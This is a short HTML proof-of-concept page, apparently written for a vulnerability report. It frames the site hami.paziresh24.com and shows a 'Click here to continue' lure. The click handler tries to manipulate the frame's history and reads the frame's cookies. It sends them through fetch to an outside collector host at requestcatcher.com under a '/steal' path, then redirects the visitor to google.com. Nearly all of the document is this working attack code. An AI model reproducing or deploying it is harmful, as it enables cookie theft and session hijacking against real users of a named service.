<!DOCTYPE html>
<html>
<head>
    <title>PoC - Redirect + Cookie Theft</title>
</head>
<body>
    <a href="#" id="clickBtn">Click here to continue</a>
    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
    <script>
        const iframe = document.querySelector('iframe');
        const btn = document.getElementById('clickBtn');

        btn.addEventListener('click', function (e) {
            e.preventDefault();

            try {
                // 1. تغییر URL در iframe (با pushState که توسط iframe-parent-url.js اورراید شده)
                iframe.contentWindow.history.pushState({}, '', 'https://www.google.com');

                // 2. خوندن کوکی از iframe (اگه دسترسی داشته باشیم)
                const cookie = iframe.contentWindow.document.cookie;
                if (cookie) {
                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
                    alert('Cookie sent!');
                } else {
                    alert('No cookie found (or HttpOnly)');
                }

                // 3. ریدایرکت کاربر به google.com
                window.top.location.href = 'https://www.google.com';

            } catch (e) {
                console.log('Error:', e.message);
                alert('Error: ' + e.message);
            }
        });
    </script>
</body>
</html>
